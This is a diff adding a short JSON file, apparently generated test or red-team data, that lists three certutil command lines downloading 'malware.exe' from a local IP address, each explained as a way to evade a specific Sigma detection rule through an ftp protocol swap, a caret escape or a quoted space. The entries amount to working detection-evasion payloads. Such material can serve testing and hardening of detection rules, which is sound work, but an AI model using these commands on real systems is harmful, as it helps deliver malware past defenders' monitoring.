@@ -1,0 +1,14 @@
+[
+  {
+    "output": "certutil.exe -urlcache -split -f ftp://192.168.1.100/malware.exe C:\\\temp\\malware.exe",
+    "explanation": "The Sigma rule relies on the 'selection\\_http' condition, which strictly looks for the string 'http'. By changing the download protocol to 'ftp://', the command successfully bypasses this condition while still executing the file download."
+  },
+  {
+    "output": "cmd.exe /c certutil.exe -url^cache -split -f http://192.168.1.100/malware.exe C:\\\temp\\malware.exe",
+    "explanation": "The rule uses 'selection\\_flags' to look for the exact literal strings 'urlcache ' or 'verifyctl '. By using the Command Prompt caret (^) escape character, the logged command line becomes '-url^cache', which breaks the literal string match and evades detection."
+  },
+  {
+    "output": "certutil.exe -urlcache\" \"-split -f http://192.168.1.100/malware.exe C:\\\temp\\malware.exe",
+    "explanation": "The rule expects a space directly after 'urlcache' ('urlcache '). By wrapping the space in double quotes (which certutil ignores during argument parsing), the logged command line records 'urlcache\" \"', bypassing the trailing space requirement in the rule's signature."
+  }
+]
